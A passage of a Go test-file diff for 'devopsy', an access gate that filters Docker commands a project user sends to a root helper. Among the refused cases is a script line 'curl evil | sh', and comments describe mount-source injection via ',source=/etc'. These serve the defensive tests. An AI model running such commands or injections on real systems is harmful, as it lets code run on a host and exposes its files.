@@ -32,11 +32,36 @@ func (d fakeDaemon) Containers() ([]string, error) {
 	return ids, nil
 }
 
+// testImages are the images on the fake daemon, by every name they go by: id first.
+var testImages = [][]string{
+	{"sha256:aaa", "devopsy.internal/shop-prod/web", "devopsy.internal/shop-prod/web:latest"},
+	{"sha256:bbb", "busybox:devopsy-shop-prod-20240101000000"},
+	{"sha256:ccc", "devopsy.internal/blog-prod/web", "devopsy.internal/blog-prod/web:latest"},
+	// A name without a host is a registry's, whoever put it here (the deploy user's build).
+	{"sha256:abd", "shop-prod-web"},
+	{"sha256:ddd", "busybox:devopsy-blog-prod-20240101000000"},
+	{"sha256:eee", "postgres:16"},
+	{"sha256:fff", "registry.example.com/blog/private:1"},
+}
+
+// Image finds an image by id or name.
+func (d fakeDaemon) Image(ref string) (string, []string, error) {
+	for _, img := range testImages {
+		if slices.Contains(img, ref) {
+			return img[0], img[1:], nil
+		}
+	}
+	return "", nil, errors.New("no such image")
+}
+
 var testDaemon = fakeDaemon{
-	"mine":   {"com.docker.compose.project": "shop-prod", "traefik.enable": "true"},
-	"task":   {"devopsy.env": "shop-dev", "devopsy.task": "owners"},
+	"mine":   {"com.docker.compose.project": "shop-prod", "traefik.enable": "true", "devopsy.door": "devopsy-shop"},
+	"task":   {"devopsy.env": "shop-dev", "devopsy.task": "owners", "devopsy.door": "devopsy-shop"},
 	"victim": {"com.docker.compose.project": "other-prod", "traefik.http.routers.x.rule": "secret", "devopsy.export.BASE": "b", "devopsy.role": "proxy"},
 	"bare":   {},
+	// Under this project's names, made outside the door: by the deploy user, or for another user.
+	"adopted": {"com.docker.compose.project": "shop-prod", "secret": "s"},
+	"theirs":  {"devopsy.env": "shop-prod", "devopsy.task": "owners", "devopsy.door": "devopsy-other", "secret": "s"},
 }
 
 // fakeHost is fakePaths with the door's own space.
@@ -62,10 +87,16 @@ func (h *fakeHost) WorkDir() (string, error) {
 var testKnown = Known{
 	Image: "util:1", Dockerfile: "FROM alpine\n", Owners: "own script", Export: "export script", Import: "import script",
 	ReflinkProbe: "probe", SnapshotTar: "tar script", Space: "space script", Share: "share script",
-	Daemon: "daemon script", Restore: "restore script", RsyncCopy: []string{"rsync", "-a"}, Clone: CloneScriptForm,
+	Daemon: "daemon script", Restore: "restore script", Receive: "receive script", RsyncCopy: []string{"rsync", "-a"}, Clone: CloneScriptForm,
 }
 
-const daemonSettings = "uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\nauth users = nobody\nsecrets file = /etc/rsyncd.secrets\n"
+const daemonSettings = "uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n"
+
+// receive is a sync's receive as devopsy's child runs it (receiveOne): the entry or volume at
+// mount alone, no network, rsync's words after RsyncCopy over the session (known.Receive).
+func receive(mount string, args ...string) []string {
+	return slices.Concat([]string{"run", "--rm", "-i", "--network", "none", "-v", mount, "util:1", "sh", "-c", "receive script"}, testKnown.RsyncCopy, args)
+}
 
 func decide(t *testing.T, argv ...string) (*Action, error) {
 	t.Helper()
@@ -85,7 +116,7 @@ func TestDecideRefuses(t *testing.T) {
 		{"info", []string{"info"}},
 		{"system prune", []string{"system", "prune", "-f"}},
 		{"exec in its own", []string{"exec", "mine", "sh"}},
-		{"exec in another, the daemon's form", []string{"exec", "victim", "rsync", "rsync://127.0.0.1/"}},
+		{"exec in another, the daemon's form", []string{"exec", "-i", "victim", "rsync", "--server", "--daemon", "--config=/tmp/rsyncd.conf", "."}},
 		{"inspect of another", []string{"inspect", "victim"}},
 		{"inspect by a format of another", []string{"inspect", "--format", "{{json .}}", "victim"}},
 		{"inspect by a format's other spelling", []string{"inspect", "--format={{json .Config.Env}}", "victim"}},
@@ -96,6 +127,8 @@ func TestDecideRefuses(t *testing.T) {
 		{"a name that only starts the same", []string{"network", "inspect", "shopx-prod_default"}},
 		{"image rm, forced", []string{"image", "rm", "-f", "shop-prod-app"}},
 		{"volume of another", []string{"volume", "inspect", "other-prod_data"}},
+		// Its own name's shape, but no volume compose names (<compose name>_<key>).
+		{"no volume of its own", []string{"volume", "inspect", "shop-prod"}},
 		{"volume rm", []string{"volume", "rm", "shop-prod_data"}},
 		{"tag over a name others use", []string{"tag", "x", "busybox:1.37"}},
 		{"tag a hold of another's", []string{"tag", "x", "busybox:devopsy-other-prod-1"}},
@@ -120,6 +153,9 @@ func TestDecideRefuses(t *testing.T) {
 		{"all of mnt", []string{"run", "-v", "/space/mnt:/d", "util:1", "sh", "-c", "own script"}},
 		{"under an entry", []string{"run", "-v", entry + "/x:/d", "util:1", "sh", "-c", "own script"}},
 		{"another's volume", []string{"run", "-v", "other-prod_data:/d", "util:1", "sh", "-c", "own script"}},
+		// A volume is <compose name>_<key> (OwnVolume), as every one a project makes is named:
+		// a name of its own with no key is no volume of its own.
+		{"a volume of its own name with no key", []string{"run", "-v", "/space/mnt/shop-prod:/m:ro", "-v", "shop-prod:/v/db:ro", "util:1", "du", "-sk", "/m/data", "/v/db"}},
 		{"bind propagation", []string{"run", "-v", entry + ":/d:rshared", "util:1", "sh", "-c", "own script"}},
 		{"a mount with options", []string{"run", "--mount", "type=bind,source=" + entry + ",target=/d,bind-propagation=rshared", "util:1", "sh", "-c", "own script"}},
 		{"a volume's driver options", []string{"run", "--mount", "type=volume,source=shop-prod_v,target=/d,volume-opt=device=/", "util:1", "sh", "-c", "own script"}},
@@ -132,24 +168,32 @@ func TestDecideRefuses(t *testing.T) {
 		{"another's label", []string{"run", "--label", "devopsy.env=other-prod", "util:1", "sh", "-c", "own script"}},
 		{"a label of its choosing", []string{"run", "--label", "traefik.enable=true", "util:1", "sh", "-c", "own script"}},
 		{"another's name, no label", []string{"run", "--name", "devopsy-owners-other-prod-1", "util:1", "sh", "-c", "own script"}},
+		// devopsy's container names carry the environment's compose name: one of another's, or
+		// of none, could take the name that environment's next container needs.
+		{"devopsy's name of another's", []string{"run", "--name", "devopsy-sync-other-prod-12.abcdef-daemon", "--label", "devopsy.env=shop-prod", "util:1", "sh", "-c", "own script"}},
+		{"devopsy's name of no environment", []string{"run", "--name", "devopsy-sync-12.abcdef-daemon", "--label", "devopsy.env=shop-prod", "util:1", "sh", "-c", "own script"}},
+		{"devopsy's name, no word", []string{"run", "--name", "devopsy-shop-prod-1", "--label", "devopsy.env=shop-prod", "util:1", "sh", "-c", "own script"}},
 		{"a name of another's", []string{"run", "--name", "other-prod-web-1", "--label", "devopsy.env=shop-prod", "util:1", "sh", "-c", "own script"}},
 		{"an environment", []string{"run", "-e", "A=1", "util:1", "sh", "-c", "own script"}},
 		{"its daemon's settings for its own script", []string{"run", "-e", "RSYNCD_CONF=uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n", "util:1", "sh", "-c", "own script"}},
-		{"a daemon with another's settings", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=uid = 0\n[x]\npath = /", "util:1", "sh", "-c", "daemon script"}},
-		{"a daemon with no auth", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=uid = 0\ngid = 0\nuse chroot = yes\nread only = yes\n[x]\npath = /mnt/x\n", "util:1", "sh", "-c", "daemon script"}},
-		{"a daemon writing", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + strings.Replace(daemonSettings, "read only = yes", "read only = no", 1), "util:1", "sh", "-c", "daemon script"}},
-		{"a daemon serving the host", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings + "[x]\npath = /etc\n", "-e", "RSYNC_SECRET", "util:1", "sh", "-c", "daemon script"}},
+		{"a daemon with another's settings", []string{"run", "-e", "RSYNCD_CONF=uid = 0\n[x]\npath = /", "util:1", "sh", "-c", "daemon script"}},
+		{"a daemon writing", []string{"run", "-e", "RSYNCD_CONF=" + strings.Replace(daemonSettings, "read only = yes", "read only = no", 1), "util:1", "sh", "-c", "daemon script"}},
+		{"a daemon serving the host", []string{"run", "-e", "RSYNCD_CONF=" + daemonSettings + "[x]\npath = /etc\n", "util:1", "sh", "-c", "daemon script"}},
 		{"a daemon with no settings", []string{"run", "util:1", "sh", "-c", "daemon script"}},
 		{"a daemon published to the world", []string{"run", "-p", "873:873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
-		{"a port with no daemon", []string{"run", "-p", "127.0.0.1::873", "util:1", "sh", "-c", "own script"}},
+		{"a daemon on the host's loopback", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
+		{"a daemon on a network", []string{"run", "--network", "bridge", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
+		{"a receive on the host's network", slices.Concat([]string{"run", "--network", "host", "-v", "/space/mnt/shop-prod/data:/mnt/data", "util:1", "sh", "-c", "receive script"}, testKnown.RsyncCopy, []string{"devopsy::data/", "/mnt/data/"})},
+		{"a receive from a daemon on a port", receive("/space/mnt/shop-prod/data:/mnt/data", "rsync://127.0.0.1:22/data/", "/mnt/data/")},
+		{"a receive into the whole mnt", receive("/space/mnt/shop-prod:/mnt", "devopsy::data/", "/mnt/data/")},
+		{"a receive into another entry than its own module", receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::other/", "/mnt/data/")},
 		{"a password for its own script", []string{"run", "-e", "RSYNC_PASSWORD", "util:1", "sh", "-c", "own script"}},
 		{"a secret in the command line", []string{"run", "--network", "host", "-e", "RSYNC_PASSWORD=x", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"}},
-		{"a receive with no password", []string{"run", "--network", "host", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"}},
-		{"a daemon with no password", []string{"run", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings, "util:1", "sh", "-c", "daemon script"}},
 		{"a volume of another's", []string{"volume", "create", "--label", "com.docker.compose.project=other-prod", "--label", "com.docker.compose.volume=d", "other-prod_d"}},
 		{"a volume with options", []string{"volume", "create", "-o", "device=/", "--label", "com.docker.compose.volume=d", "shop-prod_d"}},
 		{"a pull with a flag", []string{"pull", "--platform", "x", "busybox"}},
-		{"the port of another's", []string{"port", "victim", "873"}},
+		{"the port of its own daemon", []string{"port", "mine", "873"}},
+		{"its daemon serving something else", []string{"exec", "-i", "mine", "rsync", "--server", "--daemon", "--config=/mnt/x", "."}},
 		{"a clone script running more", []string{"run", "-v", "/space/clones/shop/a:/c", "util:1", "sh", "-c", "set -e\nmkdir -p /c/mnt /c/volumes\ncurl evil | sh\n"}},
 		{"a clone from outside /m", []string{"run", "-v", "/space/clones/shop/a:/c", "util:1", "sh", "-c", "set -e\nmkdir -p /c/mnt /c/volumes\ncp -a --reflink=always '/etc' '/c/mnt/' || cp -a --reflink=always '/etc' '/c/mnt/'\n"}},
 		{"another's clones", []string{"run", "-v", "/space/clones/other/a:/c", "util:1", "sh", "-c", "own script"}},
@@ -233,6 +277,16 @@ func TestDecidePS(t *testing.T) {
 	}
 }
 
+// An inspect of its own container goes to Docker typed: untyped, Docker answers for an image
+// or a volume of the same name, another's, once the container went after the check.
+func TestDecideInspectIsAContainers(t *testing.T) {
+	t.Parallel()
+	a, err := decide(t, "inspect", "--format", "{{.State.Status}}", "mine")
+	if err != nil || !slices.Equal(a.Docker, []string{"inspect", "--type", "container", "--format", "{{.State.Status}}", "mine"}) {
+		t.Errorf("an inspect of its own: %+v, %v", a, err)
+	}
+}
+
 func TestDecideInspectLabels(t *testing.T) {
 	t.Parallel()
 	a, err := decide(t, "inspect", "--format", "{{.Id}} {{json .Config.Labels}}", "mine", "victim", "gone")
@@ -253,6 +307,51 @@ func TestDecideInspectLabels(t *testing.T) {
 	}
 }
 
+// The door acts only on containers it made for this user (DoorLabel): compose's and devopsy's
+// labels are anyone's to set outside it, so a container the deploy user made under this
+// project's names, as root and with any mount, stays out of the project user's reach.
+func TestDecideOnlyWhatTheDoorMade(t *testing.T) {
+	t.Parallel()
+	for _, id := range []string{"adopted", "theirs"} {
+		for _, argv := range [][]string{
+			{"inspect", id}, {"rm", "-f", id}, {"exec", "-i", id, "rsync", "--server", "--daemon", "--config=/tmp/rsyncd.conf", "."},
+		} {
+			if _, err := decide(t, argv...); err == nil {
+				t.Errorf("%q: not refused", argv)
+			}
+		}
+		if a, err := decide(t, "ps", "-a"); err != nil || slices.Contains(a.Docker, "id="+id) {
+			t.Errorf("ps lists %s: %v, %v", id, a, err)
+		}
+		if a, err := decide(t, "inspect", "--format", "{{.Id}} {{json .Config.Labels}}", id); err != nil || strings.Contains(a.Output, "secret") {
+			t.Errorf("its labels show: %v, %v", a, err)
+		}
+	}
+	got := testPolicy.Foreign(testDaemon)
+	if !slices.Equal(got, []string{"adopted", "theirs"}) {
+		t.Errorf("foreign under its names: %q", got)
+	}
+	// What it starts carries its label, the caller's own refused.
+	a, err := decide(t, "run", "-v", "/space/mnt/shop-prod:/m:ro", "util:1", "du", "-sk", "/m/data")
+	if err != nil || !strings.Contains(strings.Join(a.Docker, " "), "--label devopsy.door=devopsy-shop ") {
+		t.Errorf("a util container's labels: %v, %v", a, err)
+	}
+	if _, err := decide(t, "run", "--label", "devopsy.door=devopsy-shop", "-v", "/space/mnt/shop-prod:/m:ro", "util:1", "du", "-sk", "/m/data"); err == nil {
+		t.Error("a caller's door label: not refused")
+	}
+	file := map[string]any{"name": "shop-prod", "services": map[string]any{
+		"web": map[string]any{"image": "busybox:1.37"},
+		"db":  map[string]any{"image": "busybox:1.37", "labels": map[string]any{"a": "b"}},
+	}}
+	testPolicy.Label(file)
+	for _, svc := range []string{"web", "db"} {
+		labels, _ := file["services"].(map[string]any)[svc].(map[string]any)["labels"].(map[string]any)
+		if labels["devopsy.door"] != "devopsy-shop" {
+			t.Errorf("%s: labels %v", svc, labels)
+		}
+	}
+}
+
 func TestDecideAllows(t *testing.T) {
 	t.Parallel()
 	entry := "/space/mnt/shop-prod/data"
@@ -263,12 +362,13 @@ func TestDecideAllows(t *testing.T) {
 		{"network", "inspect", "-f", "x", "shop-prod_default"},
 		{"network", "inspect", "traefik"},
 		{"image", "inspect", "--format", "{{json .}}", "busybox:1.37"},
-		{"image", "rm", "busybox:devopsy-shop-prod-1", "shop-prod-app:latest"},
+		{"image", "rm", "busybox:devopsy-shop-prod-1", "devopsy.internal/shop-prod/app:latest"},
 		{"volume", "inspect", "--format", "{{.Name}}", "shop-prod_data"},
 		{"tag", "sha256:abc", "busybox:devopsy-shop-prod-20260101"},
 		{"rm", "-f", "mine"},
-		{"exec", "task", "rsync", "rsync://127.0.0.1/"},
-		{"run", "--rm", "--name", "devopsy-owners-1", "--label", "devopsy.env=shop-prod", "--label", "devopsy.task=owners", "--network", "none",
+		{"exec", "-i", "task", "rsync", "--server", "--daemon", "--config=/tmp/rsyncd.conf", "."},
+		{"run", "--rm", "--name", "devopsy-sync-shop-prod-12.abcdef-daemon", "util:1", "sh", "-c", "own script"},
+		{"run", "--rm", "--name", "devopsy-owners-shop-prod-1", "--label", "devopsy.env=shop-prod", "--label", "devopsy.task=owners", "--network", "none",
 			"--mount", "type=bind,source=" + entry + ",target=/mnt/data", "util:1", "sh", "-c", "own script", "sh", "data", "10001:10001"},
 		{"run", "--mount", "type=bind,source=" + entry + ",target=/x/data,readonly", "-v", "shop-prod_db:/x/db:ro", "util:1", "sh", "-c", "export script", "sh", "data", "db"},
 		{"run", "--network", "none", "--mount", "type=bind,source=" + entry + ",target=/mnt/data", "--mount", "type=bind,source=/home/devopsy-shop/shop/prod/t.tar,target=/in/t.tar,readonly", "util:1", "sh", "-c", "import script", "sh", "/in/t.tar", "data", "data", "./data/x"},
@@ -277,9 +377,8 @@ func TestDecideAllows(t *testing.T) {
 		{"run", "-v", "/space/mnt/shop-prod:/m:ro", "-v", "shop-prod_db:/v/db:ro", "util:1", "du", "-sk", "/m/data", "/v/db"},
 		{"run", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "find", "/mnt", "-mindepth", "1", "-delete"},
 		{"run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--chown=1:1", "/src/data/", "/dst/data/"},
-		{"run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"},
-		{"run", "-d", "-p", "127.0.0.1::873", "-e", "RSYNCD_CONF=" + daemonSettings + "[data]\npath = /mnt/data\n[app.ini]\npath = /mnt\ninclude = /app.ini\nexclude = *\n", "-e", "RSYNC_SECRET", "-v", "/space/mnt/shop-prod:/mnt:ro", "util:1", "sh", "-c", "daemon script"},
-		{"port", "task", "873"},
+		receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data/"),
+		{"run", "-d", "--network", "none", "-e", "RSYNCD_CONF=" + daemonSettings + "[data]\npath = /mnt/data\n[app.ini]\npath = /mnt\ninclude = /app.ini\nexclude = *\n", "-v", "/space/mnt/shop-prod:/mnt:ro", "util:1", "sh", "-c", "daemon script"},
 		{"run", "-v", "/space/clones/shop/abc/mnt:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "/src/data/", "/dst/data/"},
 		{"run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", "/space/clones/shop/abc:/c", "util:1", "sh", "-c", "probe", "sh", "/m/mnt/data"},
 	} {
@@ -289,10 +388,32 @@ func TestDecideAllows(t *testing.T) {
 	}
 }
 
-// BUG: parseMount splits a caller's --mount on commas, but place's answer is put back
-// into one unquoted. A link in the tree to a path holding `,source=/etc` passes as a
-// clone or an entry of this project's, and Docker takes the last source: a root util
-// container then holds any host path.
+// Every owner a util container gives what it writes is held: an rsync's --chown as the owners
+// form's (userRefused: never root's, a host id or a project user's), and a snapshot tar's, the
+// project user's to collect, to that user's uid alone.
+func TestDecideRunChownHeldAsAnOwner(t *testing.T) {
+	t.Parallel()
+	for owner, refused := range map[string]bool{"10001:10001": false, "0:0": true, "10001:0": true, "1000:1000": true, "50001:50001": true} {
+		_, err := decide(t, "run", "-v", "/space/mnt/shop-prod:/src:ro", "-v", "/space/mnt/shop-dev:/dst", "util:1", "rsync", "-a", "--chown="+owner, "/src/data/", "/dst/data/")
+		if (err != nil) != refused {
+			t.Errorf("--chown=%s: %v, refused %v", owner, err, refused)
+		}
+	}
+	tree := "/home/devopsy-shop/shop/prod/snapshots/1.tmp/data"
+	p := testPolicy
+	p.UID = "50001"
+	for owner, refused := range map[string]bool{"50001:50001": false, "0:0": true, "50001:0": true, "10001:10001": true, "1000:1000": true} {
+		_, err := Decide([]string{"run", "-v", "/space/mnt/shop-prod:/m/mnt:ro", "-v", tree + ":/o", "util:1", "sh", "-c", "tar script", "sh", "mnt", "data", "mnt.data.tar.zst", owner}, p, testDaemon, &fakeHost{}, testKnown)
+		if (err != nil) != refused {
+			t.Errorf("a snapshot tar's owner %s: %v, refused %v", owner, err, refused)
+		}
+	}
+}
+
+// A --mount's source stays one path once place's answer is put back into it: a link in
+// the tree to a path holding `,source=/etc` passes as a clone or an entry of this
+// project's, and Docker takes the last source, so a root util container would hold any
+// host path.
 func TestDecideRunMountSourceStaysOnePath(t *testing.T) {
 	t.Parallel()
 	link := "/home/devopsy-shop/shop/prod/link"
@@ -305,9 +426,9 @@ func TestDecideRunMountSourceStaysOnePath(t *testing.T) {
 	}
 }
 
-// BUG: a mount's target is never checked, so a project's files, copied in read-only, can
-// sit over the util image's own binaries: "own script" then runs the project's find or
-// rsync as root, with --network host on a sync's receive. A util container runs only
+// A mount's target never sits over the util image's own files: a project's files, copied
+// in read-only, would replace its binaries, and "own script" would run the project's find
+// or rsync as root, with --network host on a sync's receive. A util container runs only
 // what devopsy gives it (internals/door.md).
 func TestDecideRunTargetsLeaveTheImageAlone(t *testing.T) {
 	t.Parallel()
@@ -317,22 +438,20 @@ func TestDecideRunTargetsLeaveTheImageAlone(t *testing.T) {
 			t.Errorf("a project's files over %s: %q", target, a.Docker)
 		}
 	}
-	if a, err := decide(t, "run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", bin+":/usr/bin:ro", "-v", "/space/mnt/shop-prod:/mnt",
-		"util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/"); err == nil {
-		t.Errorf("a project's rsync, as root on the host's network: %q", a.Docker)
+	if a, err := decide(t, slices.Insert(receive("/space/mnt/shop-prod/data:/mnt/data", "devopsy::data/", "/mnt/data/"), 5, "-v", bin+":/usr/bin:ro")...); err == nil {
+		t.Errorf("a project's files over a receive's rsync, as root: %q", a.Docker)
 	}
 }
 
-// BUG: what devopsy itself asks and the door has no answer for, so a project user's
-// release fails there: ensureVolumes (--import into a missing volume, a child's prepare,
-// --reset after its down --volumes), and images' Pull (a rollback or restart whose image
-// is gone from the server, a restore's landing). TestDoorKnowsDevopsysDockerCalls only
-// looks at `UtilImage, "sh", "-c"`, so it does not see these.
+// The door answers what devopsy itself asks outside its util containers, or a project
+// user's release fails there: ensureVolumes (--import into a missing volume, a child's
+// prepare, --reset after its down --volumes), and images' Pull (a rollback or restart
+// whose image is gone from the server, a restore's landing).
 func TestDecideAnswersWhatDevopsyAsks(t *testing.T) {
 	t.Parallel()
 	for _, argv := range [][]string{
 		{"volume", "create", "--label", "com.docker.compose.project=shop-prod", "--label", "com.docker.compose.volume=data", "shop-prod_data"},
-		{"pull", "-q", "busybox@sha256:abc"},
+		{"pull", "-q", "busybox@sha256:" + strings.Repeat("ab", 32)},
 	} {
 		if _, err := decide(t, argv...); err != nil {
 			t.Errorf("%q: %v", argv, err)
@@ -342,7 +461,7 @@ func TestDecideAnswersWhatDevopsyAsks(t *testing.T) {
 
 // A root container never holds a path a project user can change: what is read is
 // copied in by that user's rights, what is written goes back by them, and what the
-// container runs gives up what it does not need.
+// container runs gives up what it does not need, its own files read-only among them.
 func TestDecideRunKeepsRootOffTheTree(t *testing.T) {
 	t.Parallel()
 	tree := "/home/devopsy-shop/shop/prod"
@@ -356,7 +475,7 @@ func TestDecideRunKeepsRootOffTheTree(t *testing.T) {
 	if strings.Contains(joined, tree) {
 		t.Errorf("a root container holds the tree: %s", joined)
 	}
-	for _, want := range []string{"/space/work/in/stream:/in/stream:ro", "/space/mnt/shop-prod/data:/mnt/data", "--network none", "--cap-drop MKNOD", "--security-opt no-new-privileges"} {
+	for _, want := range []string{"--mount type=bind,source=/space/work/in/stream,target=/in/stream,readonly", "--mount type=bind,source=/space/mnt/shop-prod/data,target=/mnt/data", "--network none", "--cap-drop MKNOD", "--security-opt no-new-privileges", "--read-only", "--tmpfs /tmp:rw,noexec,nosuid,nodev,size=1m"} {
 		if !strings.Contains(joined, want) {
 			t.Errorf("no %q in %s", want, joined)
 		}
@@ -395,7 +514,7 @@ func TestDecideRunKeepsRootOffTheTree(t *testing.T) {
 	if a.Stream.From != tree+"/s/data/f.zst" || a.Stream.To != tree+"/s/fifo/tar" {
 		t.Errorf("its ends: %+v", a.Stream)
 	}
-	if strings.Contains(strings.Join(a.Stream.Docker, " "), tree) || !slices.Contains(a.Stream.Docker, "ALL") {
+	if strings.Contains(strings.Join(a.Stream.Docker, " "), tree) || !slices.Contains(a.Stream.Docker, "ALL") || !strings.Contains(strings.Join(a.Stream.Docker, " "), " --pull never ") {
 		t.Errorf("its container: %q", a.Stream.Docker)
 	}
 }
@@ -409,24 +528,6 @@ func TestDecideBuildsItsOwnDockerfile(t *testing.T) {
 	}
 	if a.Stdin != testKnown.Dockerfile {
 		t.Errorf("builds from %q", a.Stdin)
-	}
-}
-
-// Read, an admin's grant, opens reads and nothing else.
-func TestDecideReadAll(t *testing.T) {
-	t.Parallel()
-	p := testPolicy
-	p.ReadAll = true
-	for _, argv := range [][]string{{"ps", "-a"}, {"inspect", "victim"}, {"network", "ls"}, {"network", "inspect", "other-prod_default"}} {
-		a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown)
-		if err != nil || !slices.Equal(a.Docker, argv) {
-			t.Errorf("%q: %+v, %v", argv, a, err)
-		}
-	}
-	for _, argv := range [][]string{{"exec", "victim", "sh"}, {"logs", "victim"}, {"rm", "-f", "victim"}, {"network", "connect", "x", "victim"}, {"tag", "x", "busybox:1.37"}} {
-		if a, err := Decide(argv, p, testDaemon, &fakeHost{}, testKnown); err == nil {
-			t.Errorf("%q: %+v", argv, a)
-		}
 	}
 }
 
@@ -468,6 +569,12 @@ func TestDecideRunRemovals(t *testing.T) {
 	if err != nil || !slices.Contains(a.Docker, "/s/abc") || !slices.Equal(a.Remove, []string{snaps + "/.clone"}) {
 		t.Errorf("the clones and their link: %+v, %v", a, err)
 	}
+	// Two clones in one removal: both go, in one root container.
+	host.links[snaps+"/.clone/2"] = clones + "/2"
+	a, err = run("/s/.clone/1", "/s/.clone/2")
+	if err != nil || !slices.Contains(a.Docker, "/s/abc/1") || !slices.Contains(a.Docker, "/s/abc/2") {
+		t.Errorf("two clones: %+v, %v", a, err)
+	}
 	a, err = run("/s/1.tmp")
 	if err != nil || len(a.Docker) != 0 || !slices.Equal(a.Remove, []string{snaps + "/1.tmp"}) {
 		t.Errorf("its own: %+v, %v", a, err)
@@ -475,26 +582,37 @@ func TestDecideRunRemovals(t *testing.T) {
 	if a, err = run("/s/out"); err == nil {
 		t.Errorf("a link out of its tree: %+v", a)
 	}
+	// Inside a clone's copy, where the project user's own directories are (CloneDir), no
+	// removal goes: only a clone or a take, the door's and a root copy's.
+	host.links[snaps+"/.clone/1/mnt/data"] = clones + "/1/mnt/data"
+	if a, err = run("/s/.clone/1/mnt/data"); err == nil {
+		t.Errorf("a removal inside a clone's copy: %+v", a)
+	}
 }
 
 // What of the image store is the server's is the admin's: for a project user there is
-// nothing to do, nothing was refused for it, and a release says nothing about it.
+// nothing to do, nothing was refused for it, and a release says nothing about it, the
+// project's own names asked with them removed.
 func TestDecideImagePruneAndOthersDoNothing(t *testing.T) {
 	t.Parallel()
-	for _, argv := range [][]string{{"image", "prune", "-f"}, {"image", "rm", "busybox:1.37"}, {"image", "rm", "other-prod-app"}} {
+	for _, argv := range [][]string{{"image", "prune", "-f"}, {"image", "rm", "busybox:1.37"}, {"image", "rm", "other-prod-app"}, {"image", "rm", "shop-prod-web"}, {"image", "rm", "devopsy.internal/blog-prod/web"}} {
 		a, err := decide(t, argv...)
 		if err != nil || len(a.Docker) != 0 || a.Exit != 0 {
 			t.Errorf("%q: %+v, %v", argv, a, err)
 		}
 	}
-}
-
-// A secret comes by name. Its value on stdin is the door's to read, never a word.
-func TestDecideRunSecretByName(t *testing.T) {
-	t.Parallel()
-	a, err := decide(t, "run", "--network", "host", "-e", "RSYNC_PASSWORD", "-v", "/space/mnt/shop-prod:/mnt", "util:1", "rsync", "-a", "rsync://127.0.0.1:9000/data/", "/mnt/data/")
-	if err != nil || a.Secret != "RSYNC_PASSWORD" {
-		t.Errorf("%+v, %v", a, err)
+	// Another project's hold under a repository this project names (its bookmark on a Docker
+	// Hub image under this project's names, mongo-express:devopsy-shop-prod-1 for mongo) is
+	// that project's reference count: never this one's to remove, whatever the repository.
+	for _, argv := range [][]string{{"image", "rm", "shop-prod-web:devopsy-blog-prod-20260101000000"}, {"image", "rm", "shop-prod-web:latest", "shop-prod-web:devopsy-blog-prod-20260101000000"}} {
+		if a, err := decide(t, argv...); err == nil && len(a.Docker) != 0 {
+			t.Errorf("%q removes another project's hold: %+v", argv, a)
+		}
+	}
+	// Its own names among the server's: its own go, the others stay.
+	a, err := decide(t, "image", "rm", "busybox:1.37", "busybox:devopsy-shop-prod-1", "other-prod-app", "devopsy.internal/shop-prod/app")
+	if err != nil || !slices.Equal(a.Docker, []string{"image", "rm", "busybox:devopsy-shop-prod-1", "devopsy.internal/shop-prod/app"}) {
+		t.Errorf("its own names among the server's: %+v, %v", a, err)
 	}
 }
 
@@ -518,10 +636,10 @@ func TestOwnNameLeavesLongerProjects(t *testing.T) {
 	}
 }
 
-// BUG: mountSource is checked only for a source starting with `/`, so a bare word passes
-// as this project's volume whatever follows its name, and goes back into a --mount
-// unquoted: Docker takes the last source, the host's /etc here, rw, in a root util
-// container. Run by hand: Docker takes `type=bind,source=shop-x,source=/etc,target=/mnt`.
+// A bare word as a --mount's source is checked too, and stays one word: put back into a
+// --mount with more after its name, Docker would take the last source, the host's /etc
+// here, rw, in a root util container (Docker takes
+// `type=bind,source=shop-x,source=/etc,target=/mnt`).
 func TestDecideRunBareSourceStaysOnePath(t *testing.T) {
 	t.Parallel()
 	for _, kind := range []string{"bind", "volume"} {
@@ -532,8 +650,8 @@ func TestDecideRunBareSourceStaysOnePath(t *testing.T) {
 	}
 }
 
-// BUG: flagValues knows `-f x` and `-f=x`, not `-fx`, and whatever it leaves goes to
-// docker as it is: `-fid=<another's>` widens the listing the door's own id filters cut.
+// A ps lets no filter of the caller's reach docker, `-fx` no more than `-f x` or `-f=x`:
+// `-fid=<another's>` would widen the listing the door's own id filters cut.
 func TestDecidePSCutsAShortFilter(t *testing.T) {
 	t.Parallel()
 	a, err := decide(t, "ps", "-a", "-fid=victim", "--format", "{{json .}}")
@@ -543,6 +661,41 @@ func TestDecidePSCutsAShortFilter(t *testing.T) {
 	for _, arg := range a.Docker {
 		if strings.Contains(arg, "victim") {
 			t.Errorf("another's id reaches docker: %q", a.Docker)
+		}
+	}
+}
+
+// A sync's receive holds the one entry or volume it writes, mounted alone, with no network:
+// what the parent's daemon serves cannot replace the entry, a file entry is the file itself
+// written in place, and what it wrote comes back to the project user (Regrant).
+func TestDecideRunReceive(t *testing.T) {
